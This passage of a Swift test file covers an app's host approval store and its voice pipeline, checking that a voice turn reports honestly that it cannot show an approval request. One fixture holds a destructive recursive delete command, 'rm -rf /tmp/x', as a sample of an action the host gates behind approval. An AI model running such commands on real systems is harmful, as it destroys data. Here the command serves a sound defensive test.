        let probe = SenderProbe()
        probe.attach(to: store)

        store.raiseDegraded(runID: "run-s1", profileID: nil, endpoint: Self.endpoint)
        #expect(store.current != nil)
        #expect(store.current?.question == nil)
        await store.requestChoice("deny")
        #expect(probe.calls.map(\.choice) == ["deny"], "the stream-independent Deny must land")
        #expect(store.resolvedChoice == "deny")

        // Question first, then the degraded raise for the same run: keep the
        // host's own words.
        let store2 = HostApprovalStore()
        store2.raise(Self.request())
        store2.raiseDegraded(runID: "run-s1", profileID: nil, endpoint: Self.endpoint)
        #expect(store2.current?.question != nil, "a renderable question must never be downgraded")
    }

    /// Bar 304-E: `approval.responded` teardown is idempotent and scoped to
    /// its run.
    @Test func markResolvedIsIdempotentAndScopedToTheRun() {
        let store = HostApprovalStore()
        store.raise(Self.request(runID: "run-s1"))

        store.markResolved(runID: "run-other", choice: "once")
        #expect(store.current != nil, "another run's resolution must not tear this card down")

        store.markResolved(runID: "run-s1", choice: "once")
        #expect(store.current == nil)
        #expect(store.resolvedChoice == "once")

        store.markResolved(runID: "run-s1", choice: "deny")
        #expect(store.resolvedChoice == "once", "a duplicate resolution changes nothing")
    }

}

// MARK: - #304 review-2 ruling: the voice consumer's HONEST REFUSAL

/// Round 1 tried the cross-store raise ("open the chat" made true by raising
/// the shared card from the voice consumer). The re-review traced it false:
/// the ONLY route from Talk to chat is ending the session, whose teardown
/// (`endSession` → `turnTask?.cancel()`) destroyed the card before the chat
/// was reachable — and a second raiser made the chat's unscoped
/// `clearForTurnEnd()` sites a cross-surface race. **Round 2's ruling is
/// option (b): the voice surface states the honest refusal — it cannot show
/// or answer the approval, the host denies by its own timeout — and
/// instructs NOTHING false.** No card is raised (the pipeline no longer even
/// holds a store reference — removed, not just unwired), which is what
/// discharges the two-raiser race. A voice-surface ANSWER path is #305's
/// scope. This suite pins the copy's honesty; the round-1 tests' refusal to
/// compile against this code is the recorded inversion.
@MainActor
struct VoiceHostApprovalTests {

    /// A minimal scripted backend: yields the pre-hold updates immediately,
    /// then holds the stream OPEN until `release()` — the deterministic
    /// mid-turn observation window (no sleep races, no network).
    @MainActor
    private final class ScriptedVoiceBackend: HermesClientProtocol {
        var connectionStatus: ConnectionStatus = .connected
        var currentConversation: Conversation?
        private let beforeHold: [StreamingUpdate]
        private let afterHold: [StreamingUpdate]
        private var held: AsyncStream<StreamingUpdate>.Continuation?

        init(beforeHold: [StreamingUpdate], afterHold: [StreamingUpdate]) {
            self.beforeHold = beforeHold
            self.afterHold = afterHold
        }

        func release() {
            guard let continuation = held else { return }
            for update in afterHold { continuation.yield(update) }
            continuation.finish()
            held = nil
        }

        func connect() async {}
        func disconnect() async {}
        func send(message: String, attachments: [PendingAttachment], clientMessageID: UUID) async -> Message {
            Message(sender: .hermes, content: "", status: .delivered)
        }
        func sendStreaming(message: String, attachments: [PendingAttachment], clientMessageID: UUID) -> AsyncStream<StreamingUpdate> {
            AsyncStream { continuation in
                for update in beforeHold { continuation.yield(update) }
                held = continuation
            }
        }
        func loadConversation() async -> Conversation { Conversation(title: "voice-test") }
        func clearConversation() async throws -> Conversation { Conversation(title: "voice-test") }
    }

    @Test func aVoiceTurnsApprovalProducesTheHonestRefusalAndInstructsNothingFalse() async {
        let request = RunApprovalRequest(
            runID: "run-v1",
            profileID: nil,
            endpoint: SessionsHermesClient.ResolvedEndpoint(baseURL: "http://hermes.test", apiKey: "k"),
            question: RunApprovalRequest.Question(
                command: "rm -rf /tmp/x",
                description: "destructive recursive delete",
                patternKey: "rm_rf",
                choices: ["once", "deny"]
            )
        )
        let backend = ScriptedVoiceBackend(
            beforeHold: [.approvalRequested(request)],
            afterHold: [
                .approvalResolved(runID: "run-v1", choice: "deny"),
                .finished(Message(sender: .hermes, content: "done", status: .delivered), nil, nil),
            ]
        )
        let speech = SpeechOutputService()
        speech.managesAudioSession = false
        let voice = NativeVoicePipelineService(backendProvider: { backend }, speechOutput: speech)

        voice.commitUserUtterance("clean the scratch build")

        // Wait for the approval frame's status line to land mid-turn.
        var pumps = 0
        while voice.statusMessage?.localizedCaseInsensitiveContains("approval") != true, pumps < 200 {
            pumps += 1
            try? await Task.sleep(for: .milliseconds(10))
        }
        let status = voice.statusMessage ?? ""
        // The honest refusal: what is true, and only what is true.
        #expect(status.localizedCaseInsensitiveContains("can't show"),
                "the copy must state this surface cannot show the approval — got: \(status)")
        #expect(status.localizedCaseInsensitiveContains("window expires"),
                "the copy must state the host denies by its own timeout — got: \(status)")
        // Round 2's whole point: NO instruction toward a surface that will
        // not have the card (the re-review's endSession-teardown trace).
        #expect(!status.localizedCaseInsensitiveContains("open the chat"),
                "no instruction to open a chat that cannot answer — got: \(status)")
        #expect(!status.localizedCaseInsensitiveContains("open talaria"))

        // The turn itself survives the park and the resolution frame — the
        // honest line is a status, not a failure.
        backend.release()
        try? await Task.sleep(for: .milliseconds(100))
        #expect(voice.voiceState != .idle, "the approval frames must not kill the voice session")
    }
}
